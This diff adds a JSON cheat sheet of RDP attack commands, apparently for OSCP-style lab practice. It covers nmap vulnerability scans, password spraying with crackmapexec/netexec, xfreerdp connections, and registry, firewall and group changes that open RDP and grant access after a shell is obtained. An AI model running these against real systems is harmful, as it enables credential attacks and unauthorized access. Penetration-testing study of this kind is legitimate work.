@@ -1,0 +1,54 @@
+{
+  "service": "RDP",
+  "port": 3389,
+  "categories": [
+    {
+      "category": "1. Recon & Spraying",
+      "tasks": [
+        {
+          "id": "rdp_nmap",
+          "title": "Nmap RDP Scan",
+          "description": "Identify RDP service details and check for vulnerabilities like BlueKeep.",
+          "commands": [
+            "nmap -p 3389 -sV -sC {target_ip}",
+            "nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 {target_ip}"
+          ]
+        },
+        {
+          "id": "rdp_password_spray",
+          "title": "Password Spraying (CME / NetExec)",
+          "description": "Spray credentials against RDP. Note: Use --local-auth when dealing with local accounts instead of domain accounts.",
+          "commands": [
+            "crackmapexec rdp {target_ip} -u users.txt -p '/home/kali/Desktop/OSCP/Tools/Password cracking/jonspass.txt' --continue-on-success",
+            "netexec rdp {target_ip} -u <user> -p '<password>' --local-auth"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "2. Authentication & Hijacking",
+      "tasks": [
+        {
+          "id": "rdp_xfreerdp",
+          "title": "Connect via xfreerdp",
+          "description": "Connect to the target with clipboard sharing and drive mounting enabled.",
+          "commands": [
+            "xfreerdp3 /v:{target_ip} /u:<username> /p:'<password>' +clipboard /drive:/home/kali/Desktop /dynamic-resolution",
+            "xfreerdp3 /v:{target_ip} /u:<username> /d:<domain> /p:'<password>' +clipboard /dynamic-resolution"
+          ]
+        },
+        {
+          "id": "rdp_enable_remotely",
+          "title": "Enable RDP Remotely (If disabled)",
+          "description": "If you have a shell (e.g., via Evil-WinRM or SMBExec) but RDP is closed, use these commands to open it and add your user to the RDP group.",
+          "commands": [
+            "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+            "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes",
+            "net start TermService",
+            "net localgroup \"Remote Desktop Users\" <username> /add"
+          ]
+        }
+      ]
+    }
+  ]
+}
